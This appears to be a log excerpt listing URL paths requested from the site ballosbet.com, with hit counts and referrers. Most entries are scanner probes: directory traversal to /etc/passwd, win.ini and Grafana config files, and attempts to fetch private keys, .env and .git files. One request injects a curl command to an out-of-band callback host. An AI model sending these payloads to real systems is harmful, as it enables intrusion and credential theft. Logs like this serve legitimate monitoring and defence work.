+/wp-content/uploads/cfom_files/32ry05q6b4dtmzrt7kvcunczyzp.php 2 -
+/%2577eb%2575i_%2577sma_Http 2 -
+/favicon.png 11 -
+//................windows/win.ini 1 -
+/public/plugins/welcome/../../../../../conf/defaults.ini 1 -
+/public/plugins/debug/../../../../../conf/defaults.ini 1 -
+/ws/rest/v1/xxxxxx 3 -
+/public/plugins/gettingstarted/../../../../../conf/defaults.ini 1 -
+/auth/ 2 -
+/admin/default/ 2 -
+/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini 2 -
+/servlet/codesettree 4 -
+/concerto/services/RepositoryService 2 -
+/login_password_page.php 2 -
+/public/plugins/rackerlabs-blueflood-datasource/../../../../../conf/defaults.ini 1 -
+//.well-known/pki-validation/ 1 -
+/_api/web/siteusers 4 -
+/logIn 2 -
+/cmisatom/cmis-online/query 2 https://www.ballosbet.com
+/uapim/upload/grouptemplet 1 -
+/ows 4 -
+/public/plugins/grafana-enterprise-logs-app/../../../../../conf/defaults.ini 1 -
+/hmc/j_security_check 2 -
+/3ds1633693954432212 2 -
+/Tool/uploadfile.php 2 -
+/user/main 2 https://ballosbet.com//user/login/
+/eoffice10/server/public/iWebOffice2015/OfficeServer.php 2 -
+/ca/rest/certrequests 2 -
+//PMA/server_import.php 1 -
+/roundcube/installer/index.php 2 -
+/public/plugins/grafana-azure-monitor-datasource/../../../../../conf/defaults.ini 1 -
+/properties-list.php 4 -
+/objects/getImageMP4.php 4 -
+/OASREST/v2/authenticate 1 -
+//PKI/ 1 -
+/send_order.cgi 2 -
+/public/plugins/auxmoney-waterfall-panel/../../../../../conf/defaults.ini 1 -
+/wp-content/uploads/simple-file-list/haeiegd.php 2 -
+/wp-content/uploads/32ry0sRuqpleMeQvo339ndvybiO.php 2 -
+/phpinfo.php 2 -
+/heapdump 2 -
+/public/plugins/table-old/../../../../../conf/defaults.ini 1 -
+/public/plugins/clarity89-finnhub-datasource/../../../../../conf/defaults.ini 1 -
+/service/rest/beta/repositories/bower/group 2 -
+/author/baxc454urj/ 2 https://ballosbet.com/
+/public/plugins/grafana-honeycomb-datasource/../../../../../conf/defaults.ini 1 -
+/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd 1 -
+/public/plugins/tempo/../../../../../conf/defaults.ini 1 -
+/public/plugins/alertmanager/../../../../../conf/defaults.ini 1 -
+/drag/onlDragDatasetHead/getTotalData 2 -
+/rest/V1/guest-carts/1/estimate-shipping-methods 2 -
+/api/2.0/mlflow/model-versions/create 2 -
+/api/tokens 4 -
+/sysinfo.cgi 2 https://ballosbet.com
+/wp-content/plugins/vr-calendar-sync/assets/js/public.js 1 -
+/public/plugins/hadesarchitect-cassandra-datasource/../../../../../conf/defaults.ini 1 -
+/libs/granite/core/content/login.html/j_security_check 14 https://www.ballosbet.com//libs/granite/core/content/login.html
+/wp-json/rps_result/v1/route/search_student 2 -
+/..%5C..%5Cetc/passwd 1 -
+/dfsms/index.php 2 -
+/api/experimental/test 2 -
+/radio/application/configs/application.ini 1 -
+/w_selfservice/oauthservlet/../../DownLoadCourseware 1 -
+/wp-content/plugins/w3-total-cache/pub/sns.php 2 -
+/wp-content/plugins/wpcargo/includes/32ry0o40y8YuuGkwRK24P7wPcYU.php 3 -
+/general/file_folder/swfupload_new.php 2 -
+/public/plugins/radensolutions-netxms-datasource/../../../../../conf/defaults.ini 1 -
+/api/session 2 -
+/U4P6o.txt 2 -
+/test.txt 2 -
+/task/loginValidation.php 2 -
+/dashboard/proc.php 2 -
+/labkey/home/project-begin.view 2 -
+/xwiki/rest/wikis/xwiki/pages 2 -
+//................etc/passwd 1 -
+/public/plugins/grafana-salesforce-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-piechart-panel/../../../../../conf/defaults.ini 1 -
+/Synchronization 2 -
+/thruk/cgi-bin/login.cgi 2 -
+/admin/dashboard.php 6 -
+/zabbix/zabbix.php 2 -
+/banker/index.php 2 -
+//pki/ 1 -
+/public/plugins/ryantxu-annolist-panel/../../../../../conf/defaults.ini 1 -
+/dI8pyF.txt 2 -
+/app/rest/users/id:1/tokens/32ry0TTuJHtYe7HZGGM59rkw4Xt 1 -
+/public/plugins/redis-explorer-app/../../../../../conf/defaults.ini 1 -
+/32ry0UyXIwXk400szuqtfwzf6Yy/../../ThinVnc.ini 1 -
+/@vite/env 2 -
+/hp/device/SignIn/Index 2 -
+/wp-content/uploads/kaswara/fonts_icon/ejjyuy/cb.php 2 -
+/E-mobile/App/Ajax/ajax.php 2 -
+/public/plugins/volkovlabs-form-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/citilogics-geoloop-panel/../../../../../conf/defaults.ini 1 -
+/api/system/options/core.email 2 -
+/config/fillbacksetting.php 2 -
+/console/j_security_check 13 -
+/sys/ui/sys_ui_component/sysUiComponent.do 2 -
+/ajax/getemaildata.php 1 -
+/MagicInfo/servlet/SWUpdateFileUploader 4 -
+/wp-content/plugins/wpcargo/includes/32ry0akCYW0ELarIPNcBe2ooC51.php 1 -
+/wp-content/plugins/dokan-pro/changelog.txt 2 -
+/file=wp-block-template-part 2 -
+/cgi-bin/../../../../etc/passwd 1 -
+/index.do 2 -
+/index.action 20 -
+/public/plugins/novatec-sdg-panel/../../../../../conf/defaults.ini 1 -
+/csrf 2 -
+/hms/doctor/ 2 -
+//id_rsa_4096 1 -
+/umotion/modules/reporting/track_import_export.php 3 -
+/public/plugins/jeanbaptistewatenberg-percent-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/simpod-json-datasource/../../../../../conf/defaults.ini 1 -
+/importexport.php 2 -
+//.ssh/id_ed25519 1 -
+/public/plugins/marcusolsson-gantt-panel/../../../../../conf/defaults.ini 1 -
+//ssl.txt 1 -
+/public/plugins/ryantxu-ajax-panel/../../../../../conf/defaults.ini 1 -
+/hax/..CFIDE/adminapi/_servermanager/servermanager.cfc 2 -
+/config/jwt/private.pem 1 -
+/admin/configs/application.ini 1 -
+/loadfile.lp 2 -
+/install 2 -
+/apisix/admin/user/login 1 -
+/data/cache_template/rss.tpl.php 4 -
+/axis2-admin/login 3 -
+/cert/ballosbet.com.txt 1 -
+/api/32ry0UyGlPluKQLGssPuSY9s7Nk 2 -
+/public/plugins/grafana-splunk-monitoring-datasource/../../../../../conf/defaults.ini 1 -
+/modules/pwd.html 2 -
+/hmc/login 2 -
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc 2 -
+/wp-json/buddypress/v1/signup 2 -
+/queues 2 -
+/api/2.0/services/usermgmt/password/wgmawm 2 -
+/public/plugins/dalmatinerdb-datasource/../../../../../conf/defaults.ini 1 -
+/./RestAPI/LogonCustomization 4 -
+/public/plugins/voxter-app/../../../../../conf/defaults.ini 1 -
+/userportal/api/rest/contentChannels/ 2 -
+/modules/ndk_steppingpack/search-result.php 3 -
+/ocsp/ 1 -
+/unified-console.html 2 -
+/api/v0/train 1 -
+/defaultroot/upload/fileUpload.controller 2 -
+/ZQjpiMHC64.php 2 -
+/public/plugins/shorelinesoftware-shoreline-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-clock-panel/../../../../../conf/defaults.ini 1 -
+/content/.. 1 https://ballosbet.com/
+/api/server/version 4 -
+/direct/polling/CommandsPolling.php 1 -
+/public/plugins/factry-untimely-panel/../../../../../conf/defaults.ini 1 -
+/wp-json/rps_result/v1/route/student_fields 2 -
+/page/exportImport/uploadOperation.jsp 3 -
+/public/plugins/grafana-orbit-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/cloudspout-button-panel/../../../../../conf/defaults.ini 1 -
+/opencms/cmisatom/cmis-online/query 2 https://www.ballosbet.com
+/fileserver/32rBXG5MFkJUzsfeWyUV8mqHrmt.txt 3 -
+/view/IPV6/naborTable/static_convert.php 2 -
+/public/plugins/kentik-connect-app/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-azuredevops-datasource/../../../../../conf/defaults.ini 1 -
+/api/content/ 2 -
+/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/wordpress/wp-admin/setup-config.php 1083 -
+/sellers.json 2 -
+//code.jquery.com/jquery-3.3.1.min.js 8 -
+/public/plugins/graphite/../../../../../conf/defaults.ini 1 -
+/wv0Lo/CVE-2023-47246.txt 2 -
+/Home/login/index.html 2 https://ballosbet.com/index.php/Home/login/index.html
+/casmain.xgi 2 -
+/api/v1/users/signin 2 -
+/page/exportImport/fileTransfer/poc.jsp 1 -
+/eoffice10/server/public/iWebOffice2015/Document/lrqgf.php 2 -
+/public/plugins/mtanda-google-calendar-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/annolist/../../../../../conf/defaults.ini 1 -
+//db/server_import.php 1 -
+/cps/test_backup_server 2 -
+/CFIDE/adminapi/accessmanager.cfc 2 -
+/public/plugins/mssql/../../../../../conf/defaults.ini 1 -
+/login 6 -
+/CDGServer3/NoticeAjax 2 -
+/eps/api/resourceOperations/upload 1 -
+/general/status.html 2 -
+/app 14 https://ballosbet.com/app
+/public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini 1 -
+/bin/cron.php 2 -
+/api/clusters 2 -
+/api/user/reg 2 -
+/public/plugins/grafana-servicenow-datasource/../../../../../conf/defaults.ini 1 -
+/cfusion/..CFIDE/wizards/common/utils.cfc 2 -
+/certificates/ballosbet.com.p12 1 -
+/images/icons_title.gif 4 -
+/assets/php/upload.php 4 -
+/ncupload/n2d19a.jsp 1 -
+/RST_status.htm 3 -
+/admin/ajax.php 10 -
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini 1 -
+/lcms/index.php 2 -
+/cgi-bin/MANGA/index.cgi 2 -
+/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php 2 -
+//wp-config-backup.txt 1 -
+/api/v1/system/system-information 1 -
+/pages/doenterpagevariables.action 1 -
+/postlocal 2 -
+/Upload/test/32ry0qTuu7nlWmZaD788SlcYmII.php 2 -
+/oputilsServlet 4 -
+//www.key 1 -
+/32ry0tPbTS6kiJCfztNYCH0ecUR.jsp 1 -
+/images.listener.php 2 -
+/public/css/32ry0EsKunXJcEXUFCC4aEMLkEe.css 1 -
+/moto/application/configs/application.ini 1 -
+/module/ 6 https://www.ballosbet.com/admin/view:modules/load_module:users
+/wp-job-portal-jobseeker-controlpanel/jobs 1 -
+/api/v1/livechat/sms-incoming/twilio 1 -
+/%C0%AE/%C0%AE/%C0%AE/%C0%AE/WEB-INF/web.xml 1 -
+/32ry0TF2zY5IYjF3xvrl9zqsZ08.txt 2 -
+//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini 1 -
+/public/plugins/goshposh-metaqueries-datasource/../../../../../conf/defaults.ini 1 -
+/aplicacao/application/configs/application.ini 1 -
+/jeecg-boot/jmreport/show 2 -
+/aspera/faspex/package_relay/relay_package 2 -
+/public/plugins/netsage-bumpchart-panel/../../../../../conf/defaults.ini 1 -
+/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js 1 -
+/help/admin-guide/test.jsp 1 -
+//../../../../../../../../../etc/passwd 1 -
+/bsh.servlet.BshServlet 4 -
+/wp-config-backup.txt 1 -
+/.webui/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini 1 -
+/service/error/sfdc_preauth.jsp 1 -
+/ballosbet.com.key 1 -
+/php/connector.minimal.php 4 -
+/.webui/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini 1 -
+/sitecore/shell/ClientBin/Reporting/Report.ashx 2 -
+/upload/UploadResourcePic.ashx 2 -
+/.env.prod 2 -
+/server_import.php 1 -
+/public/plugins/grafana-astradb-datasource/../../../../../conf/defaults.ini 1 -
+/filex/read-raw 2 -
+/about/../tree 1 -
+/wp-content/plugins/documentor-lite/core/js/documentor.js 1 -
+/lucee/admin/web.cfm 2 -
+/nagiosql/admin/logbook.php 3 -
+/API/convertCSVtoParquet.php 2 -
+/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php 1 -
+/public/plugins/candlestick/../../../../../conf/defaults.ini 1 -
+//localhost.key 1 -
+/cslu/v1/scheduler/jobs 2 -
+/assets/../../.HTTP/HTTP.db 1 -
+/32ry0mB6ZhLCzSfitdl18Z0q3bH.txt 1 -
+//cert/ballosbet.com_key.txt 2 -
+/var/jwt/private.pem 1 -
+/application/configs/application.ini 1 -
+/id_rsa_1024 1 -
+/public/plugins/volkovlabs-image-panel/../../../../../conf/defaults.ini 1 -
+/ajax/render/widget_tabbedcontainer_tab_panel 4 -
+/tcp.php 2 -
+/template/aui/text-inline.vm 2 -
+/public/plugins/snuids-radar-panel/../../../../../conf/defaults.ini 1 -
+/include/thdy.txt 2 -
+/32ry0jz85sMN26npKOEP27vUMsM 2 -
+/opensis/index.php 2 -
+/api/json/session/signin 2 -
+/SolarWinds/InformationService/v3/Json/Query 2 -
+/wp-json/rsvpmaker/v1/stripesuccess/anythinghere 2 -
+/.well-known/delete-account 2 -
+/process/login.php 2 -
+/content/32ry0ltSMZg1lsGVCjFUEQqKi8J.af.internalsubmit.json 1 https://www.ballosbet.com/
+/api/v1/database/1 10 -
+/tiki-login_scr.php 4 -
+/loginok.html 2 -
+/wp-json/wp/v2/give_forms/ 2 -
+/dir.html 2 -
+/delete_cart_goods.php 2 -
+/login.php 4 -
+/../../../../../../../../../../../../../etc/passwd 1 ballosbet.com
+/public/plugins/streamr-datasource/../../../../../conf/defaults.ini 1 -
+/toolbox-resource/../serverconfig.xml 1 -
+/down.php 2 -
+/run 7 -
+/WebInterface/function/ 4 -
+/wp-content/plugins/showbizpro/temp/update_extract/JFHCr.php 2 -
+/menu/home 2 -
+/formLoginAuth.htm 2 -
+/.env.development.local 3 -
+/file-manager/backend/text 2 -
+/runners/start 2 -
+/public/plugins/redis-app/../../../../../conf/defaults.ini 1 -
+/public/plugins/gridprotectionalliance-openhistorian-datasource/../../../../../conf/defaults.ini 1 -
+/api/user/login 1 -
+/Service.do 2 -
+/client/api 1 -
+/api/v2/simulation 2 -
+/actuator/gateway/routes/32ry0akLa7AgCQUtr4wxeyOkkGC 2 -
+/public/plugins/bessler-pictureit-panel/../../../../../conf/defaults.ini 1 -
+/php/config/output.txt 4 -
+/CardSolution/card/accessControl/swingCardRecord/deleteFtp 2 -
+/ws_utc/resources/setting/options 3 -
+/public/plugins/akumuli-datasource/../../../../../conf/defaults.ini 1 -
+/api/Notify 2 -
+/public/plugins/vertamedia-clickhouse-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/stat/../../../../../conf/defaults.ini 1 -
+/tracking/client_1/get-resource 2 -
+/.well-known/assetlinks.json 2 -
+/dXFUy.txt 2 -
+/js/twint_ch.js 5 -
+//.env.prod.local 3 -
+/modules/cartabandonmentpro_Old/upload.php 2 -
+/logo/32ry0bSSQj7yJuW5CaQJsZlPfFH.txt 2 -
+/jfnnwex 2 -
+/public/plugins/zuburqan-parity-report-panel/../../../../../conf/defaults.ini 1 -
+/login.cgi 10 -
+/api/session/properties 2 -
+/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/32ry0nS2DXLWbAkhAfIjrvqGcws.txt 2 -
+/gz/LoadOtherTreeServlet 1 -
+//private-key 1 -
+/common/jlwni.txt 2 -
+/invoker/readonly 2 -
+/device/description_en.html 1 -
+/elFinder/php/connector.minimal.php 2 -
+/public/plugins/doitintl-bigquery-datasource/../../../../../conf/defaults.ini 1 -
+/user/login/ 4 -
+/public/plugins/innius-video-panel/../../../../../conf/defaults.ini 1 -
+/db_dump.php 2 https://ballosbet.com//user_add.php
+/menu/admin/logmanager 2 -
+/plug/comment/commentList.asp 2 -
+/cgi-bin/mainfunction.cgi/cvmcfgupload 1 -
+/v1/api 1 -
+/scgi-bin/platform.cgi 4 -
+//wp-config.php_orig 1 -
+/api/agent/tabs/agentData 2 -
+/api/v1.index.goods/getList.html 2 -
+/mgmt/tm/util/bash 6 -
+/.ssh/id_rsa_1024 1 -
+/InformationService/v3/Json/Query 2 -
+/certs/ballosbet.com.key 1 -
+/hac/ 2 -
+/config_application.txt 2 -
+//..///////..////..//////etc/passwd 1 -
+/user/signin/ 2 -
+/userRpm/LoginRpm.htm 2 -
+/delsnap.pl 2 -
+/login/dologin 2 -
+/................windows/win.ini 1 -
+/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20d35u8vv3cnchvb4gjelgb6wbonghd67dp.oast.me 1 -
+/modules/cartabandonmentproOld/upload.php 2 -
+/fileDownload 4 -
+/objects/getSpiritsFromVideo.php 4 -
+/chaosblade 2 -
+/php/dal.php 2 -
+/public/plugins/magnesium-wordcloud-panel/../../../../../conf/defaults.ini 1 -
+/search.php 2 -
+/public/plugins/gapit-htmlgraphics-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/text/../../../../../conf/defaults.ini 1 -
+/artifactory/ui/auth/login 4 https://www.ballosbet.com//artifactory/webapp/
+/public/plugins/piechart/../../../../../conf/defaults.ini 1 -
+/goform/AccessControl 2 -
+/adminer.php 6 -
+/public/plugins/testdata/../../../../../conf/defaults.ini 1 -
+/.magnolia/admincentral 2 -
+/public/plugins/foursquare-clouderamanager-datasource/../../../../../conf/defaults.ini 1 -
+/api/users 6 -
+/cmd_sco 8 -
+/rest/auth/login 2 -
+/main/inc/ajax/extra_field.ajax.php 3 -
+/public/plugins/marcusolsson-static-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-opcua-datasource/../../../../../conf/defaults.ini 1 -
+/service/extdirect 2 -
+/Uploads/32ry0sv5vZH7kIHmLp3HsNA54Rc.php 2 -
+/public/plugins/grafana-clickhouse-datasource/../../../../../conf/defaults.ini 1 -
+/ccms/index.php 2 -
+/b_download/index.html 4 -
+/public/plugins/instana-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/snuids-svg-panel/../../../../../conf/defaults.ini 1 -
+/Token 1 -
+/api/experimental/dags/example_trigger_target_dag/paused/false 2 -
+/public/plugins/philipsgis-phlowchart-panel/../../../../../conf/defaults.ini 1 -
+//.ssh/id_rsa_1024 1 -
+/public/plugins/foursquare-studio-panel/../../../../../conf/defaults.ini 1 -
+/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php 2 -
+/public/plugins/grafana-jira-datasource/../../../../../conf/defaults.ini 1 -
+/auth/newpassword 2 -
+/hoteldruid/inizio.php 2 -
+/public/plugins/ntop-ntopng-datasource/../../../../../conf/defaults.ini 1 -
+/db/server_import.php 1 -
+/file/../../../../../../../../../../../../../../../../../../etc/passwd 1 -
+/wp-config.txt 1 -
+/Forms/login1 4 -
+/getsamplebacklog 2 -
+/ipfs/bafkreicyqcbhpicbos7ev4mrxofwqx6hvvge7pahpta6xuspr44crai5by 2 -
+/public/plugins/influxdb/../../../../../conf/defaults.ini 1 -
+//%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini 1 -
+/cgi-bin/admin.cgi 2 -
+/hw-sys.htm 4 -
+/fpui/jsp/index.jsp 1 -
+/static/..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/api/v1/signin 6 -
+/servlet/UploadServlet 1 -
+/..%5Cetc/passwd 1 -
+/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp 1 -
+/ddi/server/upload/DHku1L.php 2 -
+/WEB-INF/web.xml 2 -
+/CDGServer3/ClientAjax 2 -
+/account 5 -
+/api/router/mesh/status 1 -
+//keys/ballosbet.com.pem 1 -
+/api/hassio/app/.%09./supervisor/info 2 -
+/public/plugins/agenty-flowcharting-panel/../../../../../conf/defaults.ini 1 -
+/my-account/ 2 -
+/admin/uploads.php 2 -
+/api/jsonws/invoke 4 https://www.ballosbet.com//api/jsonws
+/static/..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/zdm/cxf/login 2 https://www.ballosbet.com//zdm/login_xdm_uc.jsp
+/public/plugins/snuids-trafficlights-panel/../../../../../conf/defaults.ini 1 -
+/control/userimage.html 4 -
+/api/v4/ci/lint 2 -
+/public/plugins/marcusolsson-json-datasource/../../../../../conf/defaults.ini 1 -
+/rGKIx4.jsp 1 -
+/assets/data/usrimg/32ry02n9mofctxmr2yunko8xiji.php 2 -
+/images/index.html 4 -
+/SearchSvc/CVSearchService.svc 2 -
+/public/plugins/natel-plotly-panel/../../../../../conf/defaults.ini 1 -
+//..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/api/v1/cav/client/status/../../admin/options 1 -
+/ioffice/prg/set/wss/ioAssistance.asmx 4 -
+/api/2.0/mlflow/registered-models/create 2 -
+/ext-js/index.html 2 -
+/p/u/doAuthentication.do 2 -
+/Visitor/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini 1 -
+/vision/RMIServlet 4 -
+/public/plugins/thalysantana-appcenter-datasource/../../../../../conf/defaults.ini 1 -
+/tree 1 -
+/webadm/ 8 -
+/public/plugins/flant-statusmap-panel/../../../../../conf/defaults.ini 1 -
+/invoke/pub.file/getFile 2 -
+/v1/agent/check/deregister/32ry0lSaf8dJemDbg56ivKIAKxd 1 -
+/.ssh/id_ed25519 1 -
+/talari/app/files/32ry0D29NnJB4ZVzQ9zEoL2vGuA 2 -
+/Proxy 1 -
+/.env.example 3 -
+//../../../../../../../windows/win.ini 1 -
+/center/api/files 2 -
+/public/plugins/grafana-timestream-datasource/../../../../../conf/defaults.ini 1 -
+/32ry06cQABHHuokkIFSh9x3mw8c.jsp 1 -
+/public/plugins/oci-logs-datasource/../../../../../conf/defaults.ini 1 -
+/api/v3/user/orgs 2 -
+/v2/api/product/manger/getInfo 2 -
+/v1/app/readFileSync 2 -
+/index.php/ajax/ 2 -
+/user/requireLogin 2 -
+/public/plugins/grafana-redshift-datasource/../../../../../conf/defaults.ini 1 -
+/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx 1 -
+/set_safety.shtml 2 -
+/Upload/upload_file.php 1 -
+/public/plugins/bsull-console-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-dynatrace-datasource/../../../../../conf/defaults.ini 1 -
+/account/index.php 2 -
+/imc/javax.faces.resource/dynamiccontent.properties.xhtml 4 -
+/file/5f7lpm.txt 2 -
+/wp-emoji-release.min.js 4 -
+//id_rsa_3072 1 -
+/service/~baseapp/UploadServlet 2 -
+/mailinspector/login.php 2 -
+/Login 2 https://ballosbet.com/login
+//.env.stage 3 -
+/account/ 3 -
+/hms/admin/ 1 -
+/commpilot/servlet/Login 1 https://ballosbet.com
+/cgi-bin/Maintain/date_config 2 -
+/conf_mail.php 1 -
+/cgi-bin/luci/ 6 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/32ry0mKJLeGc9vA8Gixnunxw3ew.jsp 1 -
+/Admin/login.php 2 -
+/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php 2 -
+/services/messagebroker/streamingamf 2 -
+/ajax-api/2.0/mlflow/experiments/create 8 -
+/wp-content/plugins/wp-automatic/inc/csv.php 3 -
+/axis2/axis2-admin/login 4 -
+/pingmessages 2 -
+/accounts/login/ 2 -
+/mailingupgrade.php 2 -
+/public/plugins/grafana-iot-sitewise-datasource/../../../../../conf/defaults.ini 1 -
+/webtools/control/forgotPassword/xmldsdump 2 -
+/404%0dnew-header:value%0da: 1 -
+/imc/primepush/../flexFileUpload 2 -
+/c6/Jhsoft.Web.login/AjaxForLogin.aspx 2 -
+/public/plugins/natel-influx-admin-panel/../../../../../conf/defaults.ini 1 -
+/boardDataWW.php 3 -
+/WebReport/8qkzHwm0.jsp 1 -
+/config/pw_left_bar.html 2 -
+/magmi/web/magmi_saveprofile.php 1 -
+/forms/doLogin 4 -
+/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows/win.ini 1 -
+//static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/public/plugins/gretamosa-topology-panel/../../../../../conf/defaults.ini 1 -
+/zimlet/com_zimbra_webex/httpPost.jsp 1 -
+/.ssh/id_rsa_3072 1 -
+/_adminer.php 2 -
+/admin/login.php 4 -
+/wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js 1 -
+/400.shtml 356 -
+/CRL/ 1 -
+/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh 1 -
+/sslvpn/tzhjg.txt 2 -
+//ocsp/ 1 -
+//my.key 1 -
+/lucee/32ry0mFMFrJBTWIO14zqXfRKoKC.cfm 1 -
+/QH.aspx 2 -
+/appliance/login 2 -
+/cgi-bin/cIXS8o.txt 2 -
+/juis_boxinfo.xml 2 -
+/serverconfig.xml 1 -
+//id_rsa_2048 1 -
+/wp-content/plugins/simple-file-list/ee-file-engine.php 2 -
+/public/plugins/integrationmatters-comparison-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/novalabs-annotations-panel/../../../../../conf/defaults.ini 1 -
+/__weave/file/etc/passwd 1 -
+/api/v5/login 2 -
+/public/plugins/alertlist/../../../../../conf/defaults.ini 1 -
+/magmi/web/info.php 2 -
+/view/systemConfig/management/FtnfkY.txt 2 -
+/dataSetParam/verification 5 -
+/wp-content/uploads/workreap-temp/32ry0jpjqUg3GL7Pyhy9BJbxzb2.php 2 -
+//home/ballosbetWORDPRESS.txt 1 -
+/ajax/api/ad/wrapAdTemplate 1 -
+/AdminService/urest/v1/LogonResource 2 -
+/keys/ballosbet.com.pem 1 -
+/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/api/v2/cmdb/system/admin/admin 2 -
+/public/plugins/nodeGraph/../../../../../conf/defaults.ini 1 -
+/AurallRECMonitor/services/svc-login.php 2 -
+/.env_sample 3 -
+/32rBXA8ltUXZ7kC8VbL8R2VQ6w1.jsp 1 -
+/wp-content/plugins/imagements/images/32ry0iplofnhw9o12mox6jpbjpw.php 2 -
+/public/plugins/grafana-simple-json-datasource/../../../../../conf/defaults.ini 1 -
+/%C0%AE/%C0%AE/%C0%AE/WEB-INF/web.xml 1 -
+/home/ballosbet-WORDPRESS.txt 1 -
+/interface-data/books-init 4 https://ballosbet.com
+/hmc/ 2 -
+/public/plugins/isaozler-paretochart-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/embraceio-metric-app/../../../../../conf/defaults.ini 1 -
+/content/32ry044rFHyhZcJn2FNRqBhHson.af.internalsubmit.json 1 https://ballosbet.com/
+/public/plugins/michaeldmoore-multistat-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-googlesheets-datasource/../../../../../conf/defaults.ini 1 -
+/password_change.cgi 2 https://www.ballosbet.com/
+/seeyon/test123456.jsp 2 -
+/wp-json/mwai-ui/v1/files/upload 2 -
+/Assets/temp/hotspot/img/logohotspot.txt 2 -
+/login.zul 2 -
+/HandleEvent 2 -
+/res/j_security_check 2 -
+/cache_public/sh.phtml 2 -
+/public/plugins/smartmakers-trafficlight-panel/../../../../../conf/defaults.ini 1 -
+/api/v1/namespaces/default/workflows 2 -
+/app/home 2 -
+/mcmadmin 1 -
+/zentao/user-login.html 4 https://www.ballosbet.com//zentao/user-login.html
+/hub/login 2 -
+/author/wadminw 2 https://ballosbet.com/
+/nodes 2 -
+/public/plugins/grafana-image-renderer/../../../../../conf/defaults.ini 1 -
+/modules/appagebuilder/apajax.php 6 https://www.ballosbet.com
+/install/install.php 2 -
+/api/search/attribute 2 -
+/Servlet/Skins 1 -
+/OA_HTML/BneViewerXMLService 4 -
+//.env_sample 3 -
+/dana-na/auth/saml-sso.cgi 2 -
+/jexws4/jexws4.jsp 1 -
+/public/plugins/devicehive-devicehive-datasource/../../../../../conf/defaults.ini 1 -
+/.git/config 23 -
+/bypass/config 2 -
+/public/plugins/histogram/../../../../../conf/defaults.ini 1 -
+/EnjoyRMIS_WS/WS/POS/cwsoa.asmx 2 -
+/public/plugins/chaosmeshorg-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-x-ray-datasource/../../../../../conf/defaults.ini 1 -
+/vendor/htmlawed/htmlawed/htmLawedTest.php 6 -
+/xwiki/rest/wikis/xwiki/spaces/Sandbox/pages/WebHome/attachments 2 -
+/api/auth/cognito/callback 2 -
+//CRL/ 1 -
+/cache_public/sh.php 2 -
+/asispanel/ 2 -
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd 1 -
+//..%5c..%5c..%5cetc/passwd 1 -
+/webroot/decision/view/ReportServer 2 -
+/public/plugins/vertica-grafana-datasource/../../../../../conf/defaults.ini 1 -
+/resources/qmc/fonts/CVE-2023-41265.ttf 1 -
+/signin/ 2 -
+/api/edr/sangforinter/v2/cssp/slog_client 2 -
+/app/modules/ut-cac/admin/cli.php 2 -
+//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd 1 -
